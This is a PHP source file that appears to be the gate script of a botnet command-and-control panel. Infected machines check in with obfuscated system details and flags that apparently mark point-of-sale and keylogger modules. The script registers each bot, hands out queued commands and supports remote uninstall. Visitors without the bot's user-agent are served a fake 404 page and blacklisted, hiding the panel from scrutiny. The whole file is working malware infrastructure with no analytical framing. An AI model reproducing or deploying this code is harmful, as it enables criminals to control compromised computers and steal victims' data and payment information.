<?php

require_once('inc/config.php');
include('inc/functions.php');

banned();

$ip        = cleanstring($_SERVER['REMOTE_ADDR']);
$time      = time();
$userandpc = addslashes(cleanstring(sXOR(hextostr($_POST['pc']), $RC4)));
$admin     = addslashes(cleanstring(sXOR(hextostr($_POST['admin']), $RC4)));
$os        = addslashes(cleanstring(sXOR(hextostr($_POST['os']), $RC4)));
$hid       = addslashes(cleanstring(sXOR(hextostr($_POST['hid']), $RC4)));
$hst       = addslashes(cleanstring(sXOR(hextostr($_POST['hst']), $RC4)));
$fw        = addslashes(cleanstring(sXOR(hextostr($_POST['fw']), $RC4)));
$user      = addslashes(cleanstring(sXOR(hextostr($_POST['user']), $RC4)));
$ram       = addslashes(cleanstring(sXOR(hextostr($_POST['ram']), $RC4)));
$cpu       = addslashes(cleanstring(sXOR(hextostr($_POST['cpu']), $RC4)));
$gpu       = addslashes(cleanstring(sXOR(hextostr($_POST['gpu']), $RC4)));
$hd        = addslashes(cleanstring(sXOR(hextostr($_POST['hd']), $RC4)));
$pos       = addslashes(cleanstring($_POST['pos']));
$ky        = addslashes(cleanstring($_POST['ky']));
$arc       = addslashes(cleanstring(sXOR(hextostr($_POST['arc']), $RC4)));
$header    = addslashes(cleanstring($_SERVER['HTTP_USER_AGENT']));


$cc = iptocountry($ip);

if ($header == $usa)
  {
    if (isset($_POST['id']))
      {
        $botid   = addslashes(cleanstring(sXOR(hextostr($_POST['id']), $RC4)));
        $bottest = mysql_query("SELECT * FROM clients WHERE id LIKE '$botid'");
        if (mysql_num_rows($bottest) == 1)
          {
            $result = mysql_query("SELECT * FROM commands WHERE botid LIKE '$botid' AND viewed='0' LIMIT 1");
            mysql_query("UPDATE clients SET status='Online' WHERE id='$botid'");
            mysql_query("UPDATE clients SET time='$time' WHERE id='$botid'");
            mysql_query("UPDATE clients SET ip='$ip' WHERE id='$botid'");
            
            if (isset($_POST['hst']) == true)
              {
                mysql_query("UPDATE clients SET hst='ON' WHERE id='$botid'");
              }
            else
              {
                mysql_query("UPDATE clients SET hst='OFF' WHERE id='$botid'");
              }
            
            if (isset($_POST['pos']) == true)
              {
                mysql_query("UPDATE clients SET pos='ON' WHERE id='$botid'");
              }
            else
              {
                mysql_query("UPDATE clients SET pos='OFF' WHERE id='$botid'");
              }
            
            if (isset($_POST['ky']) == true)
              {
                mysql_query("UPDATE clients SET ky='ON' WHERE id='$botid'");
              }
            else
              {
                mysql_query("UPDATE clients SET ky='OFF' WHERE id='$botid'");
              }
            
            while ($row = mysql_fetch_array($result))
              {
                echo "" . $row['cmd'] . "|" . $row['variable'] . "";
                $cmdid = $row['id'];
                mysql_query("UPDATE commands SET viewed='1' WHERE id='$cmdid'");
                if ($row['cmd'] == "UN")
                  {
                    mysql_query("DELETE FROM clients WHERE id='$botid'");
                  }
              }
          }
        else
          {
            mysql_query("INSERT INTO clients (id, ip, cc, time, userandpc, admin, os, status, hid, arc, fw, user, ram, cpu, gpu, hd, hst, pos, ky) VALUES ('', '$ip', '$cc','$time', '$userandpc', '$admin', '$os', 'Online', '$hid', '$arc', '$fw', '$user', '$ram', '$cpu', '$gpu', '$hd', 'OFF', 'OFF', 'OFF')");
            $botcheck = mysql_query("SELECT id FROM clients WHERE ip LIKE '$ip' AND userandpc LIKE '$userandpc'");
            $botid    = mysql_fetch_row($botcheck);
            echo 'id|' . $botid[0];
          }
      }
    else
      {
        mysql_query("INSERT INTO clients (id, ip, cc, time, userandpc, admin, os, status, hid, arc, fw, user, ram, cpu, gpu, hd, hst, pos, ky) VALUES ('', '$ip', '$cc','$time', '$userandpc', '$admin', '$os', 'Online', '$hid', '$arc', '$fw', '$user', '$ram', '$cpu', '$gpu', '$hd', 'OFF', 'OFF', 'OFF')");
        $botcheck = mysql_query("SELECT id FROM clients WHERE ip LIKE '$ip' AND userandpc LIKE '$userandpc'");
        $botid    = mysql_fetch_row($botcheck);
        echo 'id|' . $botid[0];
      }
  }
else
  {
    header("HTTP/1.0 404 Not Found");
    
    $filu = fopen("inc/blacklist.php", "a+");
    fwrite($filu, $ip.':2'."\n");
    
    echo '
		<html><head>
		<title>404 Not Found</title>
		</head><body>
		<h1>Not Found</h1>
		<p>The requested URL ';
    echo $_SERVER['PATH_TRANSLATED'];
    echo '/ was not found on this server.</p>
		<hr>
		<address>';
    echo $_SERVER['SERVER_SIGNATURE'];
    echo ' Server at ';
    echo $_SERVER['HTTP_HOST'];
    echo ' Port ';
    echo $_SERVER['SERVER_PORT'];
    echo '</address>
		</body></html>
		';
  }

?>